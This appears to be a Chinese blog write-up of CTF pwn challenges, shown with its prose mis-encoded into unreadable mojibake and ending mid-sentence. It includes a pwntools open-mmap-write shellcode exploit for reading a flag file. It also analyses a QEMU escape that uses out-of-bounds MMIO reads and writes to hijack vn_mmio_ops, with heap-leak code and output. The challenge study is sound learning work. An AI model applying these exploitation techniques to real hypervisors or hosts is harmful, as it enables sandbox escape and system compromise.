<p>æˆ‘ä»¬çŸ¥é“ mmap å¯ä»¥ä¸é€šè¿‡ IO
ç›´æ¥å°†ç£ç›˜æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ç©ºé—´å½“ä¸­ï¼Œæ‰€ä»¥æœ¬é¢˜æˆ‘ä»¬è€ƒè™‘ç”¨ open - mmap - write
çš„æ–¹å¼æ¥æ‰“å° flag æ–‡ä»¶</p>
<p>ä½†è¿™é¢˜ä¹Ÿå¡äº†æˆ‘ä¸€ä¸ªå°æ—¶ï¼Œä¸»è¦å¡åœ¨ mmap çš„ flags ä¸Šã€‚æœ€å¼€å§‹ flags =
0x22 æ—¶ mmap å³ä½¿æˆåŠŸåˆ†é…å†…å­˜ä¹Ÿæ— æ³•å°†æ–‡ä»¶å†…å®¹æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œæœ€åè°ƒæ•´ä¸º
flags=0x2 æ‰æˆåŠŸæ˜ å°„</p>
<p>ä»¥åŠé€šè¿‡è¿™é¢˜æˆ‘è¿˜å­¦åˆ°äº† mmap åœ¨åˆ†é…å†…å­˜æ—¶å¯ä»¥å°† addr è®¾ç½®ä¸º 0ï¼Œè¿™æ ·
mmap ä¼šè‡ªåŠ¨å¯»æ‰¾ä¸€å—åˆé€‚çš„å†…å­˜ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ rax æ˜¯ mmap
çš„è¿”å›å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ rax æ¥è·å– mmap ç”³è¯·çš„å†…å­˜åœ°å€ã€‚</p>
<p>æˆ‘è¿™é‡Œæ²¡æœ‰è¿œç¨‹ç¯å¢ƒï¼Œä¸ç¡®å®šè¿™ç§åšæ³•æ˜¯å¦èƒ½å¾—åˆ° flag</p>
<p>å†µä¸”ä¹‹å‰çš„ NSSCTF Round18 è¿˜å‡ºç°äº†æœ¬åœ°èƒ½æ‰“é€šè¿œç¨‹æ‰“ä¸é€šçš„æƒ…å†µï¼Œå¯èƒ½æ˜¯
flag æ–‡ä»¶ä¸è·Ÿ vuln æ–‡ä»¶åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹</p>
<p>exp å¦‚ä¸‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">shellcode_open  = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>)</span><br><span class="line">shellcode_mmap  = shellcraft.mmap(<span class="number">0</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">0x2</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">shellcode_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">mov dl, 0x80</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = shellcode_open</span><br><span class="line">shellcode += shellcode_mmap</span><br><span class="line">shellcode += shellcode_write</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="escape_langlang_mountain2">escape_langlang_mountain2</h2>
<p>QEMU é€ƒé€¸ï¼Œç¬¬ä¸€æ¬¡åš ;(</p>
<p>è¯»
<code>Dockerfile</code>ï¼Œäº†è§£åˆ°å®ƒåœ¨æ­èµ·ç¯å¢ƒä»¥åå¯åŠ¨äº†<code>start.sh</code>ï¼Œ</p>
<p>å†è¯» <code>start.sh</code>ï¼Œäº†è§£åˆ°å®ƒå¯åŠ¨äº† <code>xinetd</code>
ç¨‹åº</p>
<p>å†è¯» <code>xinetd</code>ï¼Œè¿™ä¸ªç¨‹åºçš„ä¸»è¦ä½œç”¨æ˜¯ç›‘å¬æŒ‡å®š
portï¼Œå¹¶æ ¹æ®é¢„å…ˆå®šä¹‰å¥½çš„é…ç½®æ¥å¯åŠ¨ç›¸åº”æœåŠ¡ã€‚å¯ä»¥çœ‹åˆ°
<code>server_args</code> å¤„å¯åŠ¨äº† <code>run.sh</code></p>
<p>å†è¯» <code>run.sh</code>ï¼Œå‘ç°å®ƒç”¨ QEMU èµ·äº†ä¸€ä¸ªç¨‹åºï¼Œé€šè¿‡
<code>-device vn</code> æˆ‘ä»¬å¯ä»¥çŸ¥é“ <code>vn</code> æ˜¯ä½œä¸º QEMU
ä¸­çš„ä¸€ä¸ª <code>pciè®¾å¤‡</code> å­˜åœ¨çš„ã€‚</p>
<p>é€šè¿‡ IDA æŸ¥æ‰¾å­—ç¬¦ä¸² <code>vn_</code> å¯ä»¥æ‰¾åˆ°
<code>vn_instance_init</code>ï¼Œè·Ÿè¿›è°ƒç”¨
<code>å­—ç¬¦ä¸²vn_instance_init</code> çš„
<code>å‡½æ•°vn_instance_init</code>ï¼Œå†æŒ‰ x æŸ¥çœ‹
<code>å‡½æ•°vn_instance_init</code> çš„å¼•ç”¨ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢è¿˜æœ‰ä¸€ä¸ª
<code>vn_class_init</code> ï¼Œåæ±‡ç¼–åçœ‹åˆ°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vn_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = PCI_DEVICE_CLASS_23(a1);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_vn_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x1234</span>; <span class="comment">// å‚å•†ID (Vendor ID)</span></span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x2024</span>; <span class="comment">// è®¾å¤‡ID (Device ID)</span></span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x10</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡å‚å•†IDå’Œè®¾å¤‡IDï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­ä¸‹åˆ— pci è®¾å¤‡ä¸­
<code>00:04.0 Class 00ff: 1234:2024</code> å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„
<code>vn</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/devices/pci0000:00/0000:00:04.0 # lspci</span><br><span class="line">lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2024</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>
<p>è¿›è€Œå»<code>/sys/devices/pci0000:00/0000:00:04.0</code>
ç›®å½•æŸ¥çœ‹è¯¥è®¾å¤‡ <code>mmio</code> ä¸ <code>pmio</code> çš„æ³¨å†Œæƒ…å†µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/devices/pci0000:00/0000:00:04.0 # ls -al</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">-r--r--r--    1 0        0             4096 Feb 18 12:18 resource</span><br><span class="line">-rw-------    1 0        0             4096 Feb 18 12:18 resource0</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>æœ‰äº† resource0 è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨expé‡Œ <code>mmap</code>
åšè™šæ‹Ÿåœ°å€æ˜ å°„ã€‚</p>
<p>å¹¶ä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>vn</code> è¿™ä¸ªè®¾å¤‡åªæ³¨å†Œäº†
<code>mmio</code>ï¼Œé‚£å°±è€ƒè™‘ç”¨ <a
href="https://ctf-wiki.org/pwn/virtualization/qemu/exploitation/intro/#_3">mmioæ”»å‡»ï¼ˆç‚¹å‡»è¿™é‡Œäº†è§£
mmio è¿è¡ŒåŸç†ï¼‰</a></p>
<p>ç„¶åï¼Œæœ¬é¢˜çš„æ ¸å¿ƒåœ¨äºä¼ªé€  MemoryRegion
ç»“æ„ä½“ï¼Œç”±äºä¸Šè¿°éƒ¨åˆ†æˆ‘ä¹Ÿä¸æ¸…æ¥šä¸ºä»€ä¹ˆè¦è¿™æ ·å» read å’Œ
writeï¼Œæ‰€ä»¥è¿˜éœ€è¦è¡¥å¾ˆå¤šåŸºç¡€çŸ¥è¯† (2.18æ™š)</p>
<p>èŠ±äº†ä¸€æ•´ä¸ªæ™šä¸Šçš„æ—¶é—´æŠŠ qemu è°ƒè¯•æå®šäº†ï¼Œæ˜å¤©æ‰¾ä¸€ä¸‹ QEMU
ç›¸å…³éƒ¨åˆ†çš„æºç è¯»ä¸€ä¸‹ (2.19æ™š)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è®°å½•ä¸€ä¸‹å¦‚ä½•ç”¨ docker è°ƒè¯• QEMU</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é¦–å…ˆå°† exp.c é™æ€ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line">gcc exp.c --static -o exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç„¶åè§£åŒ… rootfs.cpioï¼Œå‚è€ƒhttps://www.jianshu.com/p/f08e34cf08ad çš„â€œè°ƒè¯•â€éƒ¨åˆ†</span></span><br><span class="line">hen rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† exp æ”¾å…¥ /core/usr/bin ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡æ–°æ‰“åŒ… roortfs.cpio</span></span><br><span class="line">gen rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹ run.sh </span></span><br><span class="line">vim run.sh</span><br><span class="line"><span class="comment"># #!/bin/sh</span></span><br><span class="line"><span class="comment"># ./qemu-system-x86_64 \</span></span><br><span class="line"><span class="comment">#     -L ./pc-bios \</span></span><br><span class="line"><span class="comment">#     -m 128M \</span></span><br><span class="line"><span class="comment">#     -append &quot;console=ttyS0&quot; \</span></span><br><span class="line"><span class="comment">#     -kernel bzImage \</span></span><br><span class="line"><span class="comment">#     -initrd rootfs.cpio \</span></span><br><span class="line"><span class="comment">#     -device vn \</span></span><br><span class="line"><span class="comment">#     -nographic \</span></span><br><span class="line"><span class="comment">#     -no-reboot \</span></span><br><span class="line"><span class="comment">#     -monitor /dev/null \</span></span><br><span class="line"><span class="comment">#     -smp 2 \</span></span><br><span class="line"><span class="comment">#     -s -S</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹ Dockerfileï¼Œåœ¨åˆ›å»ºå®¹å™¨æ—¶å®‰è£… qemu-system-x86 gdbï¼Œè¿™ä¸€æ­¥å…¶å®åœ¨ å®¹å™¨çš„shellé‡Œä¹Ÿèƒ½installï¼Œå¯ä»¥è·³è¿‡</span></span><br><span class="line">vim Dockerfile <span class="comment"># ä¸‹é¢å†…å®¹åªæ˜¯ RUN éƒ¨åˆ†ï¼Œå…¶ä»–éƒ¨åˆ†ä¸åŠ¨</span></span><br><span class="line"><span class="comment"># RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     apt-get install -y lib32z1 xinetd \</span></span><br><span class="line"><span class="comment">#                        libpixman-1-dev libepoxy-dev libpng16-16 libjpeg8-dev \</span></span><br><span class="line"><span class="comment">#                        libfdt-dev libnuma-dev libglib2.0-dev \</span></span><br><span class="line"><span class="comment">#                        libgtk-3-dev libasound2-dev libcurl4 qemu-system-x86 gdb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># build ä¸ å¯åŠ¨å®¹å™¨</span></span><br><span class="line">docker-compose build</span><br><span class="line">docker start vnctf</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœå·²ç»æå‰ docker-compose å¥½äº†ï¼Œåˆ™å¯ä»¥ç›´æ¥é€šè¿‡ docker cp æ¥ä¿®æ”¹å†…éƒ¨æ–‡ä»¶</span></span><br><span class="line">docker <span class="built_in">cp</span> /path/to/file container_name:/whatever/path/you/want/to/file</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨tmuxï¼Œåˆ†é¡µè®°ä¸º pane1 å’Œ pane2</span></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti vnctf /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti vnctf /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line">./run.sh <span class="comment"># è¿™é‡Œè¿è¡Œä»¥ååº”è¯¥æ˜¯ä»€ä¹ˆä¹Ÿä¸ä¼šå‡ºç°</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">ps -ax |grep <span class="string">&quot;qemu&quot;</span> <span class="comment"># è¿™ä¸€æ­¥è·å– qemu çš„è¿›ç¨‹å·PID,ç”¨äº (gdb) attach PID</span></span><br><span class="line">gdb ./qemu-system-x86_64</span><br><span class="line">(gdb) attach PID <span class="comment"># æ¯”å¦‚ (gdb) attach 406</span></span><br><span class="line">(gdb) <span class="built_in">continue</span> <span class="comment"># è¾“å…¥å®Œä»¥åçœ‹ä¸€çœ¼ pane1ï¼Œå¦‚æœqemuå¯åŠ¨äº†å°±ç­‰qemuå¯åŠ¨</span></span><br><span class="line">               <span class="comment"># å¦‚æœæ²¡å¯åŠ¨å°±ç»§ç»­è¾“å…¥ (gdb) continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line"><span class="comment"># æ­¤æ—¶ QEMU æ­£å¸¸è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é‡Œé¢è¾“å…¥ä¸€äº›å‘½ä»¤æ¯”å¦‚lsç­‰æŸ¥çœ‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">(gdb) b vn_mmio_read</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line"><span class="built_in">cd</span> /usr/bin <span class="comment"># è¿™é‡Œæ˜¯å‰é¢è§£åŒ…åçš„æ—¶å€™ exp æ”¾å…¥çš„æ–‡ä»¶å¤¹</span></span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">æ­¤æ—¶å°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†</span><br></pre></td></tr></table></figure>
<p>ä»Šæ™šå» ctf-wiki ä¸Šçœ‹äº†ä¸€ä¸‹ QEMU å…³äº MemoryRegion
ç›¸å…³çš„ä»£ç å’Œç»“æ„ä½“ï¼Œä½†æˆ‘çªç„¶æ„è¯†åˆ°é¢˜ç›®ä¸­è®¾å¤‡çš„ <code>mmio_read</code> å’Œ
<code>mmio_write</code> æ˜¯è‡ªå·±å®ç°çš„ (æ¯”å¦‚<a
href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c">blizzardCTF
é‡Œçš„ strng</a>)ï¼Œæ‰€ä»¥åœ¨äº’è”ç½‘ä¸Šä¸ä¼šæ‰¾åˆ°ç›¸å…³çš„æºç ï¼Œåªèƒ½åæ±‡ç¼–å»ç¡¬çœ‹</p>
<p>åˆ°è¿™é‡Œå¥½åƒæœ‰ç‚¹ä¹±äº†ï¼Œæˆ‘ä»¬æ¥æ‹ä¸€ä¸‹ï¼š</p>
<p>QEMU æä¾›äº†ä¸€å¥—å®Œæ•´çš„æ¨¡æ‹Ÿç¡¬ä»¶ç»™ QEMU ä¸Šçš„ kernel æ¥ä½¿ç”¨ï¼Œè€Œ
<code>-device</code> å‚æ•°ä¸º kernel æä¾›äº†æ¨¡æ‹Ÿçš„ pci è®¾å¤‡ã€‚</p>
<p>å¦‚æœ kernel å®ç°äº†ç±»ä¼¼ linux çš„ rootfsï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡
<code>lspci</code> æ¥æŸ¥çœ‹ç›¸å…³ pciï¼Œå¹¶åœ¨/sys/devices/...æ‰¾åˆ° pci
è®¾å¤‡å¯åŠ¨æ—¶ kernel åˆ†é…ç»™ pci çš„èµ„æºï¼Œä¹Ÿå°±æ˜¯ resource0
ç­‰ï¼Œè¿™ä¹Ÿæ˜¯å‰æ–‡æåˆ°è¿‡çš„ã€‚</p>
<p>resource0 å¯ä»¥çœ‹ä½œæ˜¯ä¸€å¤§ç‰‡å¼€å…³ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹ resource0
ä¸­çš„å†…å®¹æ—¶ï¼Œå¯ä»¥çœ‹åšå¯¹åº”å¼€å…³è¢«å¯åŠ¨ï¼Œpciè®¾å¤‡ä¹Ÿéšç€å¼€å…³çš„å¯åŠ¨è€Œå˜åŒ–ï¼Œå…·ä½“è¡¨ç°ä¸ºâ€œæ§åˆ¶å¯„å­˜å™¨ã€çŠ¶æ€å¯„å­˜å™¨ä»¥åŠè®¾å¤‡å†…éƒ¨çš„å†…å­˜åŒºåŸŸ
éšç€ resource0 çš„å˜åŒ–è€Œå˜åŒ–â€</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ open resource0 è¿™ä¸ªæ–‡ä»¶ï¼Œç”¨ mmap
æ˜ å°„å®ƒï¼Œä»è€Œä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨Cä»£ç ä¸­å¯¹ resource0 è¿™ç‰‡å†…å­˜è¿›è¡Œä¿®æ”¹</p>
<p>å¯æ˜¯ç”±äº QEMU ä¹Ÿåªä¸è¿‡æ˜¯ä¸€ä¸ªç¨‹åºï¼Œè™šæ‹Ÿçš„ pci
è®¾å¤‡æ„å‘³ç€ï¼Œä¸€å®šæœ‰ä¸€ç‰‡å†…å­˜å­˜å‚¨ç€ pci ç›¸å…³çš„æ•°æ®</p>
<blockquote>
<p>å…³äº pci å­˜å‚¨æ•°æ®çš„è¿™ä¸€éƒ¨åˆ†å¥½åƒå°±æ¶‰åŠ QOM
äº†ï¼Œè¿˜æ²¡å¤ªææ‡‚ï¼Œæ€»ä¹‹è·Ÿpci_xx_realize, xx_class_init, xx_instance_init
ç­‰å‡½æ•°æœ‰å…³</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡è®¾æˆ‘ä»¬çš„è°ƒç”¨é“¾æ˜¯è¿™æ ·çš„: </span><br><span class="line">docker -&gt; QEMU -&gt; exp</span><br><span class="line"></span><br><span class="line">åˆ™ docker ä¼šè®© QEMU è¯¯ä»¥ä¸ºè‡ªå·±å æ®å…¨éƒ¨å†…å­˜ç©ºé—´ï¼ŒQEMU ä¼šè®© exp è®¤ä¸ºè‡ªå·±å æ®å…¨éƒ¨å†…å­˜ç©ºé—´</span><br><span class="line"></span><br><span class="line">è€Œ QEMU çš„ pci è®¾å¤‡çš„ MemoryRegion å°±å­˜å‚¨åœ¨ QEMU çš„å †åŒºä¸Šï¼Œæˆ‘ä»¬åœ¨ç¨‹åº exp ä¸­è¯»å†™ resource0ï¼Œå°±ç›¸å½“äºæ“æ§ vn_mmio_read å’Œ vn_mmio_write å»è¯»å†™ QEMU çš„å †åŒºï¼Œå¦‚æœæˆ‘ä»¬æ­£å¥½ä¿®æ”¹åˆ° MemoryRegion çš„ xx_mmio_ops æŒ‡é’ˆï¼Œå°±å¯ä»¥åŠ«æŒæ§åˆ¶æµã€‚</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„äº‹æƒ…å°±æ˜¯å»è¯»ä¸€ä¸‹ vn_mmio_read å’Œ vn_mmio_write
çš„åæ±‡ç¼–ï¼Œäº†è§£æ€æ ·è¯»å†™å †åŒºå†…å®¹ã€‚</p>
<p><a href="https://imgloc.com/image/oNxdA"><img
src="https://i0.imgs.ovh/2024/02/20/oNxdA.md.png"
alt="oNxdA.md.png" /></a></p>
<p>ç”±äºå¯¹ QEMU ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œæˆ‘åªèƒ½çå‘½åï¼Œvn_mmio_write çš„å¤§ä½“é€»è¾‘æ˜¯</p>
<ul>
<li><p><code>object_dynamic_cast_assert</code>æ˜¯åŠ¨æ€ç±»å‹è½¬æ¢ï¼Œæˆ‘OOPå­¦çš„å¾ˆçƒ‚æ‰€ä»¥ä¸æ¸…æ¥šè¿™æ˜¯ä»€ä¹ˆğŸ˜­ï¼ŒçŒœæµ‹æ˜¯ç”³è¯·ä¸€å—å †çš„åœ°å€ç„¶åç”¨
ptr æŒ‡å‘è¿™å—åœ°å€</p></li>
<li><p>â‘ å¦‚æœ op == 0x30 ä¸” ptr[737] == 0</p>
<ul>
<li>ptr[ ptr[736]/8 + 720 ] = varï¼Œå¹¶å°† ptr[737] è®¾ç½®ä¸º1</li>
</ul></li>
<li><p>â‘¡å¦‚æœ op == 0x10 ä¸” var &lt; 0x3C</p>
<ul>
<li>ptr[736] = var</li>
<li>è¿™é‡Œå¯ä»¥ç”¨è´Ÿæ•°æ¥ä¸Šæº¢ï¼Œä»è€Œå¯ä»¥è¯»å¾ˆå¤§ä¸€ç‰‡ç©ºé—´çš„å†…å®¹</li>
</ul></li>
<li><p>â‘¢å¦‚æœ op == 0x20 ä¸” var çš„é«˜32ä½ &lt; 0x3C</p>
<ul>
<li>ptr[ HIDWORD(var) + 720 ] = (LODWORD)var</li>
</ul></li>
</ul>
<p>åŒç† vn_mmio_read ä¹Ÿå¯ä»¥åˆ†æå‡ºæ¥ã€‚</p>
<p>é€šè¿‡åˆ†ææˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œvn_mmio_writeå¯ä»¥å®ç°ä¸€äº›è¶Šç•Œå†™ï¼ŒåŒç†åˆ†æ
vn_mmio_read
æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œä»¤å¯ä»¥å®ç°ä¸€äº›è¶Šç•Œè¯»ï¼Œæ ¹æ®åæ±‡ç¼–æˆ‘ä»¬å¯ä»¥å®šåˆ¶ä¸€ä¸‹è¿™é“é¢˜çš„
mmio_read</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint64_t</span>*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write_idx</span><span class="params">(<span class="type">uint64_t</span> idx, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> val = value + (idx &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ Shift + F12
æŸ¥<code>/bin/sh</code>å¯ä»¥è·Ÿè¿›åˆ°è¿™é“é¢˜çš„åé—¨å‡½æ•°0x67429Bï¼Œæˆ‘ä»¬éœ€è¦è·³è½¬åˆ°è¿™é‡Œå»æ‰§è¡Œexecv("/bin/sh");</p>
<p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†æ€æ ·è¯»å†™å †åŒºï¼Œä¹ŸçŸ¥é“å†™å…¥ä»€ä¹ˆä¸œè¥¿ã€‚ä½†æˆ‘ä»¬ä¸çŸ¥é“ ptr[736]
é™„è¿‘æ˜¯ä¸æ˜¯ MemoryRegionï¼Œè€Œä¸” QEMU ä¼šå¯åŠ¨ pieï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡ pie
æ‰èƒ½åˆ©ç”¨åé—¨å‡½æ•°ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å°±å…ˆè¯»ä¸€äº›å†…å®¹ï¼Œçœ‹çœ‹é™„è¿‘æœ‰æ²¡æœ‰ä»€ä¹ˆèƒ½åˆ©ç”¨çš„ä¸œè¥¿</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> catflag_addr = <span class="number">0x6E65F9</span>;</span><br><span class="line"></span><br><span class="line">    getMMIOBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_base Resource0Base: %p\n&quot;</span>, mmio_base);</span><br><span class="line">    </span><br><span class="line">    <span class="type">uint64_t</span> test_low,test_high,test;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">-1</span>;i&gt;=<span class="number">-30</span>;i--) &#123;</span><br><span class="line">        mmio_write(<span class="number">0x10</span>, i*<span class="number">0x8</span>);</span><br><span class="line">        test_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">        mmio_write(<span class="number">0x10</span>, i*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">        test_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">        test = test_low + (test_high &lt;&lt; <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test%d = 0x%llx\n&quot;</span>, -i, test);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/usr/bin # ./exp</span></span><br><span class="line"><span class="comment">mmio_base Resource0Base: 0x7fafa8025000</span></span><br><span class="line"><span class="comment">test1 = 0x0</span></span><br><span class="line"><span class="comment">test2 = 0x0</span></span><br><span class="line"><span class="comment">test3 = 0x0</span></span><br><span class="line"><span class="comment">test4 = 0x0</span></span><br><span class="line"><span class="comment">test5 = 0x55da28130f00</span></span><br><span class="line"><span class="comment">test6 = 0x55da2812ef78</span></span><br><span class="line"><span class="comment">test7 = 0x0</span></span><br><span class="line"><span class="comment">test8 = 0x55da271feb98</span></span><br><span class="line"><span class="comment">test9 = 0x55da27e4f820</span></span><br><span class="line"><span class="comment">test10 = 0x55da2812ef58</span></span><br><span class="line"><span class="comment">test11 = 0x0</span></span><br><span class="line"><span class="comment">test12 = 0x1</span></span><br><span class="line"><span class="comment">test13 = 0x0</span></span><br><span class="line"><span class="comment">test14 = 0x0</span></span><br><span class="line"><span class="comment">test15 = 0x10001</span></span><br><span class="line"><span class="comment">test16 = 0x0</span></span><br><span class="line"><span class="comment">test17 = 0x55da256a335b // -&gt; memory_region_destructor_none</span></span><br><span class="line"><span class="comment">test18 = 0xfebf1000</span></span><br><span class="line"><span class="comment">test19 = 0x0</span></span><br><span class="line"><span class="comment">test20 = 0x1000</span></span><br><span class="line"><span class="comment">test21 = 0x0</span></span><br><span class="line"><span class="comment">test22 = 0x55da271feae0</span></span><br><span class="line"><span class="comment">test23 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test24 = 0x55da25dd01e0 // -&gt; vn_mmio_ops</span></span><br><span class="line"><span class="comment">test25 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test26 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test27 = 0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬é€ä¸ªåœ°å€ <code>x/2gx</code>
